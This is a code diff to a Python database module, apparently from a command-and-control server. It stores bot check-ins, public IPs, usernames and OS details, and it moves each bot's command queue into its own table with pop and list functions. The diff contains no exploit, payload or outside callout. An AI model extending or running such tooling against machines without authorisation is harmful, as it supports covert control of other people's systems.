@@ -59,7 +59,7 @@ def bot_ips(conn:sql.Connection, id):
 
 def bot_to_dict(conn:sql.Connection, id):
     cur = conn.cursor()
-    cur.execute('''SELECT uuid, checkin, ip, username, devicename, region, memory, commandqueue, os FROM bots WHERE uuid=?''', (id,))
+    cur.execute('''SELECT uuid, checkin, ip, username, devicename, region, memory, os FROM bots WHERE uuid=?''', (id,))
     data = cur.fetchone()
     bot = {}
     if data is None:
@@ -67,15 +67,15 @@ def bot_to_dict(conn:sql.Connection, id):
     bot["uuid"] = data[0]
     bot["checkin"] = data[1]
     bot["public_ip"] = data[2]
-    if(data[8]):
-        bot["os"] = json.loads(data[8])
+    if(data[7]):
+        bot["os"] = json.loads(data[7])
     else:
         bot["os"] = {}
     bot["username"] = data[3]
     bot["devicename"] = data[4]
     bot["region"] = data[5]
     bot["memory"] = data[6]
-    bot["queue"] = data[7]
+    bot["queue"] = get_bot_queuedcommands(conn, id)
     return bot
 
 
@@ -119,17 +119,29 @@ def command_history_to_dict(conn: sql.Connection, id):
     return command_history
 
 
+def pop_bot_queuedcommand(conn: sql.Connection, id):
+    cur = conn.cursor()
+    cur.execute("SELECT time, command FROM commandqueue WHERE uuid=? ORDER BY time ASC", (id,))
+    fetched = cur.fetchone()
+    command = ""
+    if fetched != None:
+        queuetime = fetched[0]
+        command = fetched[1]     
+        cur.execute("DELETE FROM commandqueue WHERE uuid=? AND time=?", (id, queuetime,))
+        conn.commit()
+    return command
+
+
+def get_bot_queuedcommands(conn: sql.connect, id):
+    cur = conn.cursor()
+    cur.execute("SELECT command FROM commandqueue WHERE uuid=? ORDER BY time ASC", (id,))
+    return cur.fetchall()
+
 """
     =====================================================================================
         Everything below this line is legacy and should be phased out
         Everything above the line returns dictionaries which are used to return JSON strings
 """
-def get_bot_commandqueue(conn: sql.Connection, id):
-    cur = conn.cursor()
-    cur.execute("SELECT commandqueue FROM bots WHERE uuid=?", (id,))
-    return cur.fetchone()
-
-
 def get_bot_count(conn: sql.Connection):
     cur = conn.cursor()
     cur.execute('SELECT COUNT(uuid) FROM bots')
